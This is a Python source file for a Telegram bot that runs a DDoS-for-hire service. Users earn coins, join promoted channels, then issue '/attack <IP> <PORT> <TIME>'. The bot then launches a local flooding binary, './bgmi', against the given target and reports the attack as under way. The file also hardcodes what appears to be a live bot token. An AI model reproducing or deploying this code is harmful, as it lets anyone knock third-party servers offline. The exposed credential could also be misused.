import psutil
import time
from datetime import datetime
import asyncio
import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.error import BadRequest

BOT_TOKEN = "7239021384:AAEaeSs0Nn6ZRBr_Qz6WevriN-bPTKzZ1fc"
REQUIRED_CHANNELS = [
    {"name": "VOF CODING HUB", "link": "@vofcodinghub"},
    {"name": "FEEDBACKS", "link": "@voffeeds"},
]
ADMIN_ID = 7221087191
USER_FILE = "users.txt"
VERIFIED_USERS_FILE = "verified_users.txt"
USER_CLAIM_DATE_FILE = "user_claim_dates.txt"
user_cooldowns = {}
COOLDOWN_TIME = 3 * 60
MAX_ATTACK_TIME = 120
verified_users = set()
user_coins = {}
logs_file = "logs.txt"
banned_users = set()

initial_data_usage = 0  # Global variable to track data usage since VPS startup

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return set(int(line.strip()) for line in file)
    except FileNotFoundError:
        return set()

def save_user(user_id):
    users = load_users()
    if user_id not in users:
        with open(USER_FILE, "a") as file:
            file.write(f"{user_id}\n")

def load_verified_users():
    try:
        with open(VERIFIED_USERS_FILE, "r") as file:
            return set(int(line.strip()) for line in file)
    except FileNotFoundError:
        return set()

def save_verified_user(user_id):
    if user_id not in verified_users:
        with open(VERIFIED_USERS_FILE, "a") as file:
            file.write(f"{user_id}\n")

def load_user_claim_dates():
    try:
        with open(USER_CLAIM_DATE_FILE, "r") as file:
            return {int(line.split()[0]): line.split()[1].strip() for line in file}
    except FileNotFoundError:
        return {}

def save_user_claim_date(user_id, claim_date):
    claim_dates = load_user_claim_dates()
    claim_dates[user_id] = claim_date
    with open(USER_CLAIM_DATE_FILE, "w") as file:
        for user_id, date in claim_dates.items():
            file.write(f"{user_id} {date}\n")

def load_banned_users():
    try:
        with open("banned_users.txt", "r") as file:
            return set(int(line.strip()) for line in file)
    except FileNotFoundError:
        return set()

def save_banned_user(user_id):
    banned_users = load_banned_users()
    banned_users.add(user_id)
    with open("banned_users.txt", "a") as file:
        file.write(f"{user_id}\n")

async def check_user_joined(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if user_id in verified_users:
        return True
    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=channel["link"], user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        except BadRequest as e:
            print(f"Error checking channel {channel['name']} ({channel['link']}): {e}")
            return False
        except Exception as e:
            print(f"Unexpected error: {e}")
            return False
    verified_users.add(user_id)
    save_verified_user(user_id)
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    save_user(user.id)
    buttons = [
        [InlineKeyboardButton(channel["name"], url=f"https://t.me/{channel['link'][1:]}")] for channel in REQUIRED_CHANNELS
    ]
    buttons.append([InlineKeyboardButton("Check ✅", callback_data="check_channels")])
    keyboard = InlineKeyboardMarkup(buttons)
    message = (
        f"Hi {user.first_name}!\n\nTo use this bot, you must join the following channels. Click the buttons below to join, then click 'Check ✅':"
    )
    await update.message.reply_text(message, reply_markup=keyboard)

async def check_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    await query.answer()
    if await check_user_joined(user.id, context):
        await query.edit_message_text("✅ You have joined all required channels! You can now use the bot or use /attack.")
    else:
        buttons = [
            [InlineKeyboardButton(channel["name"], url=f"https://t.me/{channel['link'][1:]}")] for channel in REQUIRED_CHANNELS
        ]
        buttons.append([InlineKeyboardButton("Check ✅", callback_data="check_channels")])
        keyboard = InlineKeyboardMarkup(buttons)
        await query.edit_message_text(
            "❌ You haven't joined all required channels. Please join them and click 'Check ✅'.",
            reply_markup=keyboard,
        )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    save_user(user.id)
    if user.id == ADMIN_ID:
        pass
    else:
        if not await check_user_joined(user.id, context):
            buttons = [
                [InlineKeyboardButton(channel["name"], url=f"https://t.me/{channel['link'][1:]}")] for channel in REQUIRED_CHANNELS
            ]
            buttons.append([InlineKeyboardButton("Check ✅", callback_data="check_channels")])
            keyboard = InlineKeyboardMarkup(buttons)
            await update.message.reply_text(
                "You need to join all required channels before using this bot! Click the buttons below to join, then click 'Check ✅'.",
                reply_markup=keyboard,
            )
            return
        if user_coins.get(user.id, 0) < 2:
            await update.message.reply_text("❌ You don't have enough coins. Use /claim to get free coins.")
            return
    current_time = time.time()
    if user.id in user_cooldowns:
        last_attack_time = user_cooldowns[user.id]
        remaining_cooldown = COOLDOWN_TIME - (current_time - last_attack_time)
        if remaining_cooldown > 0:
            await simulate_loading(update, remaining_cooldown)
            return
    try:
        _, ip, port, time_duration = update.message.text.split()
        time_duration = min(int(time_duration), MAX_ATTACK_TIME)
    except ValueError:
        await update.message.reply_text("Invalid command format. Use: /attack <IP> <PORT> <TIME>")
        return
    if user.id != ADMIN_ID:
        user_coins[user.id] -= 2
    command = ["./bgmi", ip, port, str(time_duration), "100"]
    try:
        subprocess.Popen(command)
        user_cooldowns[user.id] = current_time
        attack_message = (
            f"🚀 Attack Sent Successfully! 🚀\n\n"
            f"Target: {ip} {port}\n"
            f"⏱️ Time: {time_duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
            f"Method: Private\n\n"
            f"🔥 Status: Attack in Progress... 🔥\n\n"
            f"❗ Please send feedback at: https://t.me/Vofspbot"
        )
        await update.message.reply_text(attack_message)
        context.application.job_queue.run_once(
            notify_attack_finished, when=int(time_duration), data={"chat_id": update.effective_chat.id, "ip": ip, "port": port}
        )
    except Exception as e:
        print(f"Error starting attack: {e}")
        await update.message.reply_text("Failed to start the attack. Please try again later.")

async def notify_attack_finished(context: ContextTypes.DEFAULT_TYPE):
    job_context = context.job.data
    chat_id = job_context["chat_id"]
    ip = job_context["ip"]
    port = job_context["port"]
    finished_message = f"🚀 Attack on {ip}:{port} finished ✅"
    await context.bot.send_message(chat_id=chat_id, text=finished_message)

async def simulate_loading(update: Update, remaining_cooldown):
    user = update.effective_user
    await update.message.reply_text(f"⏳ Cooldown in progress. Please wait {int(remaining_cooldown)} seconds.")

async def coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_coins_balance = user_coins.get(user.id, 0)
    await update.message.reply_text(f"💰 Your current coin balance: {user_coins_balance} coins.")

async def claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    current_date = datetime.now().strftime("%Y-%m-%d")
    claim_dates = load_user_claim_dates()
    if user.id in claim_dates and claim_dates[user.id] == current_date:
        await update.message.reply_text("❌ You have already claimed your coins today. Try again tomorrow!")
        return
    user_coins[user.id] = user_coins.get(user.id, 0) + 10
    save_user_claim_date(user.id, current_date)
    await update.message.reply_text("🎉 You have claimed 10 free coins! 💰")

async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        with open(logs_file, "r") as file:
            logs_content = file.read()
        await update.message.reply_text(f"📝 Logs:\n{logs_content}")
    else:
        await update.message.reply_text("❌ You are not authorized to view the logs.")

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        users = load_users()
        await update.message.reply_text(f"List of all users:\n" + "\n".join(map(str, users)))
    else:
        await update.message.reply_text("❌ You are not authorized to view all users.")

async def coinset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        try:
            target_user_id = int(context.args[0])
            coins_to_add = int(context.args[1])
            user_coins[target_user_id] = user_coins.get(target_user_id, 0) + coins_to_add
            await update.message.reply_text(f"Added {coins_to_add} coins to user {target_user_id}'s account.")
        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /coinset <user_id> <coins>")
    else:
        await update.message.reply_text("❌ You are not authorized to set coins.")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        try:
            target_user_id = int(context.args[0])
            save_banned_user(target_user_id)
            await update.message.reply_text(f"User {target_user_id} has been banned.")
        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /ban <user_id>")
    else:
        await update.message.reply_text("❌ You are not authorized to ban users.")

async def usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global initial_data_usage
    cpu_usage = psutil.cpu_percent()
    memory_usage = psutil.virtual_memory().used / (1024 * 1024)
    current_data_usage = psutil.net_io_counters().bytes_sent / (1024 * 1024)
    total_data_usage = current_data_usage - (initial_data_usage / (1024 * 1024))

    usage_message = (
        f"🖥 CPU Usage: {cpu_usage}%\n"
        f"🧠 Memory Usage: {memory_usage:.2f} MB\n"
        f"📊 Total Data Used Since VPS Started: {total_data_usage:.2f} MB"
    )
    await update.message.reply_text(usage_message)

def main():
    global initial_data_usage
    initial_data_usage = psutil.net_io_counters().bytes_sent

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("coins", coins))
    application.add_handler(CommandHandler("claim", claim))
    application.add_handler(CommandHandler("logs", logs))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("coinset", coinset))
    application.add_handler(CommandHandler("ban", ban))
    application.add_handler(CommandHandler("usage", usage))
    application.add_handler(CallbackQueryHandler(check_channels, pattern="check_channels"))

    application.run_polling()

if __name__ == "__main__":
    main()
